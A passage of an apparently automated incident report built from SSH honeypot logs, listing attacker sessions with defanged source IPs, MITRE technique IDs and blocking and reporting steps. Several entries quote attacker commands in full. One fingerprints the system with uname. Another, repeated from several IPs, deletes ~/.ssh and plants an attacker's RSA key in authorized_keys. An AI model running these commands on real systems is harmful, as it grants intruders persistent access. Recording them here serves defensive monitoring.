| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:12:59` | `cowrie.session.connect` |
| `2026-07-05 04:12:59` | `cowrie.client.version` |
| `2026-07-05 04:12:59` | `cowrie.client.kex` |
| `2026-07-05 04:12:59` | `cowrie.login.success` |
| `2026-07-05 04:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c717fd09b290

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 04:13 |
| **Last Seen** | 2026-07-05 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:13:03` | `cowrie.session.connect` |
| `2026-07-05 04:13:03` | `cowrie.client.version` |
| `2026-07-05 04:13:03` | `cowrie.client.kex` |
| `2026-07-05 04:13:03` | `cowrie.login.success` |
| `2026-07-05 04:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33aa206cf5e4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 04:13 |
| **Last Seen** | 2026-07-05 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:13:03` | `cowrie.session.connect` |
| `2026-07-05 04:13:03` | `cowrie.client.version` |
| `2026-07-05 04:13:03` | `cowrie.client.kex` |
| `2026-07-05 04:13:03` | `cowrie.login.success` |
| `2026-07-05 04:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a1abe9274be

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:14 |
| **Last Seen** | 2026-07-05 04:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:14:04` | `cowrie.session.connect` |
| `2026-07-05 04:14:04` | `cowrie.client.version` |
| `2026-07-05 04:14:04` | `cowrie.client.kex` |
| `2026-07-05 04:14:07` | `cowrie.login.success` |
| `2026-07-05 04:14:08` | `cowrie.session.params` |
| `2026-07-05 04:14:08` | `cowrie.command.input` |
| `2026-07-05 04:14:08` | `cowrie.command.input` |
| `2026-07-05 04:14:08` | `cowrie.command.input` |
| `2026-07-05 04:14:08` | `cowrie.command.input` |
| `2026-07-05 04:14:08` | `cowrie.command.input` |
| `2026-07-05 04:14:08` | `cowrie.command.success` |
| `2026-07-05 04:14:08` | `cowrie.command.input` |
| `2026-07-05 04:14:08` | `cowrie.command.input` |
| `2026-07-05 04:14:08` | `cowrie.command.input` |
| `2026-07-05 04:14:08` | `cowrie.command.input` |
| `2026-07-05 04:14:09` | `cowrie.log.closed` |
| `2026-07-05 04:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf01a30c6e5

| Field | Detail |
|---|---|
| **Source IP** | `125.244.114[.]221` |
| **First Seen** | 2026-07-05 04:15 |
| **Last Seen** | 2026-07-05 04:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:15:00` | `cowrie.session.connect` |
| `2026-07-05 04:15:00` | `cowrie.client.version` |
| `2026-07-05 04:15:00` | `cowrie.client.kex` |
| `2026-07-05 04:15:01` | `cowrie.login.success` |
| `2026-07-05 04:15:02` | `cowrie.session.params` |
| `2026-07-05 04:15:02` | `cowrie.command.input` |
| `2026-07-05 04:15:02` | `cowrie.command.failed` |
| `2026-07-05 04:15:03` | `cowrie.log.closed` |
| `2026-07-05 04:15:04` | `cowrie.session.params` |
| `2026-07-05 04:15:04` | `cowrie.command.input` |
| `2026-07-05 04:15:04` | `cowrie.session.file_download` |
| `2026-07-05 04:15:04` | `cowrie.log.closed` |
| `2026-07-05 04:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.244.114[.]221` to AbuseIPDB if not already reported
- [ ] Block `125.244.114[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fec3d8c6eab7

| Field | Detail |
|---|---|
| **Source IP** | `125.244.114[.]221` |
| **First Seen** | 2026-07-05 04:15 |
| **Last Seen** | 2026-07-05 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:15:04` | `cowrie.session.connect` |
| `2026-07-05 04:15:04` | `cowrie.client.version` |
| `2026-07-05 04:15:04` | `cowrie.client.kex` |
| `2026-07-05 04:15:05` | `cowrie.login.success` |
| `2026-07-05 04:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.244.114[.]221` to AbuseIPDB if not already reported
- [ ] Block `125.244.114[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9845babb6503

| Field | Detail |
|---|---|
| **Source IP** | `125.244.114[.]221` |
| **First Seen** | 2026-07-05 04:15 |
| **Last Seen** | 2026-07-05 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:15:06` | `cowrie.session.connect` |
| `2026-07-05 04:15:06` | `cowrie.client.version` |
| `2026-07-05 04:15:06` | `cowrie.client.kex` |
| `2026-07-05 04:15:07` | `cowrie.login.success` |
| `2026-07-05 04:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.244.114[.]221` to AbuseIPDB if not already reported
- [ ] Block `125.244.114[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae6ef268713

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:15 |
| **Last Seen** | 2026-07-05 04:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:15:30` | `cowrie.session.connect` |
| `2026-07-05 04:15:31` | `cowrie.client.version` |
| `2026-07-05 04:15:31` | `cowrie.client.kex` |
| `2026-07-05 04:15:34` | `cowrie.login.success` |
| `2026-07-05 04:15:36` | `cowrie.session.params` |
| `2026-07-05 04:15:36` | `cowrie.command.input` |
| `2026-07-05 04:15:36` | `cowrie.command.input` |
| `2026-07-05 04:15:36` | `cowrie.command.input` |
| `2026-07-05 04:15:36` | `cowrie.command.input` |
| `2026-07-05 04:15:36` | `cowrie.command.input` |
| `2026-07-05 04:15:36` | `cowrie.command.success` |
| `2026-07-05 04:15:36` | `cowrie.command.input` |
| `2026-07-05 04:15:36` | `cowrie.command.input` |
| `2026-07-05 04:15:36` | `cowrie.command.input` |
| `2026-07-05 04:15:36` | `cowrie.command.input` |
| `2026-07-05 04:15:37` | `cowrie.log.closed` |
| `2026-07-05 04:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45f7383d02a8

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 04:15 |
| **Last Seen** | 2026-07-05 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:15:55` | `cowrie.session.connect` |
| `2026-07-05 04:15:55` | `cowrie.client.version` |
| `2026-07-05 04:15:56` | `cowrie.client.kex` |
| `2026-07-05 04:15:57` | `cowrie.login.success` |
| `2026-07-05 04:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-271d5794429f

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 04:15 |
| **Last Seen** | 2026-07-05 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:15:56` | `cowrie.session.connect` |
| `2026-07-05 04:15:56` | `cowrie.client.version` |
| `2026-07-05 04:15:56` | `cowrie.client.kex` |
| `2026-07-05 04:15:57` | `cowrie.login.success` |
| `2026-07-05 04:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc857a77cbfe

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 04:16 |
| **Last Seen** | 2026-07-05 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:16:06` | `cowrie.session.connect` |
| `2026-07-05 04:16:06` | `cowrie.client.version` |
| `2026-07-05 04:16:06` | `cowrie.client.kex` |
| `2026-07-05 04:16:07` | `cowrie.login.success` |
| `2026-07-05 04:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4691e9e9024

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 04:16 |
| **Last Seen** | 2026-07-05 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:16:08` | `cowrie.session.connect` |
| `2026-07-05 04:16:08` | `cowrie.client.version` |
| `2026-07-05 04:16:08` | `cowrie.client.kex` |
| `2026-07-05 04:16:09` | `cowrie.login.success` |
| `2026-07-05 04:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-448c2b0e382b

| Field | Detail |
|---|---|
| **Source IP** | `103.114.147[.]217` |
| **First Seen** | 2026-07-05 04:16 |
| **Last Seen** | 2026-07-05 04:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:16:55` | `cowrie.session.connect` |
| `2026-07-05 04:16:55` | `cowrie.client.version` |
| `2026-07-05 04:16:55` | `cowrie.client.kex` |
| `2026-07-05 04:16:56` | `cowrie.login.success` |
| `2026-07-05 04:16:57` | `cowrie.session.params` |
| `2026-07-05 04:16:57` | `cowrie.command.input` |
| `2026-07-05 04:16:57` | `cowrie.command.failed` |
| `2026-07-05 04:16:58` | `cowrie.log.closed` |
| `2026-07-05 04:16:59` | `cowrie.session.params` |
| `2026-07-05 04:16:59` | `cowrie.command.input` |
| `2026-07-05 04:16:59` | `cowrie.session.file_download` |
| `2026-07-05 04:16:59` | `cowrie.log.closed` |
| `2026-07-05 04:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.114.147[.]217` to AbuseIPDB if not already reported
- [ ] Block `103.114.147[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-376b504bc60c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:16 |
| **Last Seen** | 2026-07-05 04:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:16:56` | `cowrie.session.connect` |
| `2026-07-05 04:16:57` | `cowrie.client.version` |
| `2026-07-05 04:16:57` | `cowrie.client.kex` |
| `2026-07-05 04:17:00` | `cowrie.login.success` |
| `2026-07-05 04:17:02` | `cowrie.session.params` |
| `2026-07-05 04:17:02` | `cowrie.command.input` |
| `2026-07-05 04:17:02` | `cowrie.command.input` |
| `2026-07-05 04:17:02` | `cowrie.command.input` |
| `2026-07-05 04:17:02` | `cowrie.command.input` |
| `2026-07-05 04:17:02` | `cowrie.command.input` |
| `2026-07-05 04:17:02` | `cowrie.command.success` |
| `2026-07-05 04:17:02` | `cowrie.command.input` |
| `2026-07-05 04:17:02` | `cowrie.command.input` |
| `2026-07-05 04:17:02` | `cowrie.command.input` |
| `2026-07-05 04:17:02` | `cowrie.command.input` |
| `2026-07-05 04:17:04` | `cowrie.log.closed` |
| `2026-07-05 04:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02d130ec719

| Field | Detail |
|---|---|
| **Source IP** | `103.114.147[.]217` |
| **First Seen** | 2026-07-05 04:16 |
| **Last Seen** | 2026-07-05 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:16:59` | `cowrie.session.connect` |
| `2026-07-05 04:16:59` | `cowrie.client.version` |
| `2026-07-05 04:17:00` | `cowrie.client.kex` |
| `2026-07-05 04:17:01` | `cowrie.login.success` |
| `2026-07-05 04:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.114.147[.]217` to AbuseIPDB if not already reported
- [ ] Block `103.114.147[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34833d68f647

| Field | Detail |
|---|---|
| **Source IP** | `103.114.147[.]217` |
| **First Seen** | 2026-07-05 04:17 |
| **Last Seen** | 2026-07-05 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:17:01` | `cowrie.session.connect` |
| `2026-07-05 04:17:01` | `cowrie.client.version` |
| `2026-07-05 04:17:02` | `cowrie.client.kex` |
| `2026-07-05 04:17:03` | `cowrie.login.success` |
| `2026-07-05 04:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.114.147[.]217` to AbuseIPDB if not already reported
- [ ] Block `103.114.147[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09382805c359

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 04:17 |
| **Last Seen** | 2026-07-05 04:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:17:50` | `cowrie.session.connect` |
| `2026-07-05 04:17:52` | `cowrie.client.version` |
| `2026-07-05 04:17:52` | `cowrie.client.kex` |
| `2026-07-05 04:17:58` | `cowrie.login.success` |
| `2026-07-05 04:18:02` | `cowrie.session.params` |
| `2026-07-05 04:18:02` | `cowrie.command.input` |
| `2026-07-05 04:18:04` | `cowrie.log.closed` |
| `2026-07-05 04:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa50150d6983

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:18 |
| **Last Seen** | 2026-07-05 04:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:18:21` | `cowrie.session.connect` |
| `2026-07-05 04:18:22` | `cowrie.client.version` |
| `2026-07-05 04:18:22` | `cowrie.client.kex` |
| `2026-07-05 04:18:25` | `cowrie.login.success` |
| `2026-07-05 04:18:25` | `cowrie.session.params` |
| `2026-07-05 04:18:25` | `cowrie.command.input` |
| `2026-07-05 04:18:25` | `cowrie.command.input` |
| `2026-07-05 04:18:25` | `cowrie.command.input` |
| `2026-07-05 04:18:25` | `cowrie.command.input` |
| `2026-07-05 04:18:25` | `cowrie.command.input` |
| `2026-07-05 04:18:25` | `cowrie.command.success` |
| `2026-07-05 04:18:25` | `cowrie.command.input` |
| `2026-07-05 04:18:25` | `cowrie.command.input` |
| `2026-07-05 04:18:25` | `cowrie.command.input` |
| `2026-07-05 04:18:25` | `cowrie.command.input` |
| `2026-07-05 04:18:26` | `cowrie.log.closed` |
| `2026-07-05 04:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d33036e2793

| Field | Detail |
|---|---|
| **Source IP** | `14.55.144[.]22` |
| **First Seen** | 2026-07-05 04:19 |
| **Last Seen** | 2026-07-05 04:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:19:05` | `cowrie.session.connect` |
| `2026-07-05 04:19:05` | `cowrie.client.version` |
| `2026-07-05 04:19:05` | `cowrie.client.kex` |
| `2026-07-05 04:19:06` | `cowrie.login.success` |
| `2026-07-05 04:19:07` | `cowrie.session.params` |
| `2026-07-05 04:19:07` | `cowrie.command.input` |
| `2026-07-05 04:19:07` | `cowrie.command.failed` |
| `2026-07-05 04:19:08` | `cowrie.log.closed` |
| `2026-07-05 04:19:09` | `cowrie.session.params` |
| `2026-07-05 04:19:09` | `cowrie.command.input` |
| `2026-07-05 04:19:09` | `cowrie.session.file_download` |
| `2026-07-05 04:19:09` | `cowrie.log.closed` |
| `2026-07-05 04:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.55.144[.]22` to AbuseIPDB if not already reported
- [ ] Block `14.55.144[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cefaa473564

| Field | Detail |
|---|---|
| **Source IP** | `14.55.144[.]22` |
| **First Seen** | 2026-07-05 04:19 |
| **Last Seen** | 2026-07-05 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:19:09` | `cowrie.session.connect` |
| `2026-07-05 04:19:09` | `cowrie.client.version` |
| `2026-07-05 04:19:09` | `cowrie.client.kex` |
| `2026-07-05 04:19:10` | `cowrie.login.success` |
| `2026-07-05 04:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.55.144[.]22` to AbuseIPDB if not already reported
- [ ] Block `14.55.144[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62bf3225158c

| Field | Detail |
|---|---|
| **Source IP** | `14.55.144[.]22` |
| **First Seen** | 2026-07-05 04:19 |
| **Last Seen** | 2026-07-05 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:19:10` | `cowrie.session.connect` |
| `2026-07-05 04:19:10` | `cowrie.client.version` |
